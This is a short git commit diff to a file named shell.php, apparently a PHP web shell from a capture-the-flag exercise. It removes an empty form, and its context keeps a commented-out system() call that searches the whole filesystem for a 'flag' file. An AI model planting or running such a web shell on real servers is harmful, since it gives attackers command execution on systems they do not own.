5048e59681d463cdec0e9218c90e35e7fdc28238
cyalume <cyalumeJ@gmail.com>
2024-07-23 18:43:33 +0900

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,7 +1,5 @@
 <html>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-</form>
 <pre>
     <?php
         //system("find / -name 'flag' 2>/dev/null", $result); // 1
